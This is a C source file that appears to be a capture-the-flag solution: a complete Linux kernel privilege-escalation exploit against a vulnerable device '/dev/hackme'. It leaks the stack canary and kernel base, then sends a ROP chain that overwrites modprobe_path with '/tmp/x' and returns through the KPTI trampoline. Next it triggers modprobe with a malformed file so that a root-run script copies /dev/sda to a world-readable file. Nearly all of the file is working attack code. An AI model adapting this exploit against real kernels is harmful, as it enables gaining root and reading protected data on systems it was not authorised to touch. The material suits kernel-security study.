#define _GNU_SOURCE
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <stdint.h>
#include <unistd.h>
#include <assert.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <pthread.h>
#include <err.h>
#include <errno.h>
#include <sched.h>
#include <sys/syscall.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/utsname.h>

typedef void* (*fp_commit_creds)(void *);
typedef void* (*fp_prepare_kernel_cred)(void *);

// commands
#define DEV_PATH "/dev/hackme"   // the path the device is placed

// constants
#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET
// (END constants)

// globals
// (END globals)

// utils
#define WAIT getc(stdin);
#define ulong unsigned long
#define scu static const unsigned long
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)
#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(char* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%p ", (void*)tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static void shell_modprobe(void){
    puts("[*] Returned to userland, setting up for fake modprobe");

    system("echo '#!/bin/sh\ncp /dev/sda /tmp/flag\nchmod 777 /tmp/flag' > /tmp/x");
    system("chmod +x /tmp/x");

    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    puts("[*] Run unknown file");
    system("/tmp/dummy");

    puts("[*] Hopefully flag is readable");
    system("cat /tmp/flag");

    exit(0);
}

uint64_t user_cs, user_ss, user_rflags, user_sp;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

int fd;
uint64_t buf[50];
uint64_t cookie;
uint64_t k_base;
uint64_t kpti_tramp;
uint64_t modprobe_path;
// pop rax; ret;
uint64_t pop_rax_ret;
// pop rbx; pop r12; pop rbp; ret;
uint64_t pop_rbx_r12_rbp_ret;
// // mov qword ptr [rbx], rax; pop rbx; pop rbp; ret;
uint64_t write_ptr_rbx_rax_pop_ret;

void exploit()
{
    size_t off = 16;
    buf[off++] = cookie;
    buf[off++] = 0x0; // rbx
    buf[off++] = 0x0; // r12
    buf[off++] = 0x0; // rbp
    buf[off++] = pop_rax_ret; // return address
    buf[off++] = 0x782f706d742f; // rax <- "/tmp/x"
    buf[off++] = pop_rbx_r12_rbp_ret;
    buf[off++] = modprobe_path; // rbx <- modprobe_path
    buf[off++] = 0x0; // dummy r12
    buf[off++] = 0x0; // dummy rbp
    buf[off++] = write_ptr_rbx_rax_pop_ret; // modprobe_path <- "/tmp/x"
    buf[off++] = 0x0; // dummy rbx
    buf[off++] = 0x0; // dummy rbp
    buf[off++] = kpti_tramp; // swapgs_restore_regs_and_return_to_usermode + 22
    buf[off++] = 0x0; // dummy rax
    buf[off++] = 0x0; // dummy rdi
    buf[off++] = (uint64_t)shell_modprobe;
    buf[off++] = user_cs;
    buf[off++] = user_rflags;
    buf[off++] = user_sp;
    buf[off++] = user_ss;

    if (write(fd, buf, sizeof(buf)) < 0) {
        perror("write");
    }
}


/*
 * The real deal. All security mechanisms are on.
 *
 * modprobe_path technique
 */

int main(void)
{
    save_state();

    fd = open(DEV_PATH, O_RDWR);

    if (fd < 0) {
        perror("open");
    }

    if (read(fd, buf, sizeof(buf)) < 0) {
        perror("read");
    }

    cookie = buf[16];
    k_base = buf[38] - 0xa157UL;
    kpti_tramp = k_base + 0x200f10UL + 22UL;
    pop_rax_ret = k_base + 0x4d11UL;
    pop_rbx_r12_rbp_ret = k_base + 0x3190UL;
    write_ptr_rbx_rax_pop_ret = k_base + 0x306dUL;
    modprobe_path = k_base + 0x1061820UL;

    printf("canary: %p \n", cookie);
    printf("kbase: %p \n", k_base);

    exploit();

    return 0;
}

